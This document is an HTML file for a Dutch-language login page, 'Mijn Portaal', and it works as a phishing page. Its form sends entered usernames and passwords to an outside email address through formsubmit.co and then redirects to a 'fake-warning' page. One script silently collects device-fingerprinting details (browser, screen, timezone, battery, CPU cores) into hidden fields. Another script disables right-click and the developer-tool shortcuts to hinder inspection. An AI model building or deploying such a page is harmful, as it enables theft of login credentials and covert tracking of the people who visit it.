<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Mijn Portaal</title>
  <style>
    body {
      background-color: #111;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      margin-top: 100px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      background: #222;
      color: #0f0;
      border: none;
    }
    input::placeholder {
      color: #0f0;
    }
  </style>
</head>
<body>
  <h2>Welkom bij Mijn Portaal</h2>

  <form action="https://formsubmit.co/matteogoossens@tuta.io" method="POST">
    <input type="text" name="username" placeholder="Gebruikersnaam" required><br>
    <input type="password" name="password" placeholder="Wachtwoord" required><br>
    
    <input type="hidden" name="_next" value="fake-warning.html">
    <input type="hidden" name="_captcha" value="false">
    
    <button type="submit">Inloggen</button>
  </form>

  <script>
    // Beveiliging tegen rechtsklikken (contextmenu uitschakelen)
    document.addEventListener('contextmenu', (event) => event.preventDefault());

    // Beveiliging tegen inspectietools (F12, Ctrl+Shift+I en Ctrl+U)
    document.addEventListener('keydown', function(event) {
      if (
        event.key === 'F12' || 
        (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'i') ||
        (event.ctrlKey && event.key.toLowerCase() === 'u')
      ) {
        event.preventDefault();
        alert("Deze actie is uitgeschakeld!");
      }
    });
  </script>
  <script>
window.onload = async function () {
  const form = document.querySelector("form");

  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer,
    deviceMemory: navigator.deviceMemory || 'onbekend',
    cpuCores: navigator.hardwareConcurrency || 'onbekend',
    touchSupport: 'ontouchstart' in window,
    touchPoints: navigator.maxTouchPoints,
    timeSinceLoad: performance.now().toFixed(2) + " ms"
  };

  // Batterijniveau ophalen (optioneel, async!)
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      data.battery = (battery.level * 100).toFixed(0) + '%';
    } catch (e) {
      data.battery = 'niet ondersteund';
    }
  }

  // Maak en voeg verborgen inputvelden toe aan formulier
  for (const [key, value] of Object.entries(data)) {
    const input = document.createElement("input");
    input.type = "hidden";
    input.name = key;
    input.value = value;
    form.appendChild(input);
  }
};
</script>
</body>
</html>
